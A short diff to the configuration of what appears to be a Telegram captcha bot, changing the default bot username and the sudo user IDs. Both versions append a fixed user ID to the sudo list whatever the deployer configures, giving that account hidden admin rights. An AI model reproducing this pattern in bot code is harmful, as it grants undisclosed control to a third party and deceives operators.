@@ -12,7 +12,7 @@ ARQ_API_BASE_URL = "https://thearq.tech"
 
 
 class Config(object):
-    BOT_USERNAME = os.environ.get("BOT_USERNAME", "Zaid2_Robot")
+    BOT_USERNAME = os.environ.get("BOT_USERNAME", "Shadiyobot")
     # Leave this defualt
     SESSION_NAME = os.environ.get("SESSION_NAME", "JV_CaptchaBot")
     # get it from https://cloud.mongodb.com 
@@ -20,8 +20,8 @@ class Config(object):
     # Ask in https://t.me/JV_Community
     API_TOKEN = os.environ.get("API_TOKEN", "dontsellme_iamfreeapi")
     # Sudo users(goto @JVToolsBot and send /id to get your id)
-    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "1781945165").split()))
-    SUDO_USERS.append(1669178360)
+    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "2086099281").split()))
+    SUDO_USERS.append(946481925)
     SUDO_USERS = list(set(SUDO_USERS))
 
 bot = Client(":memory:",
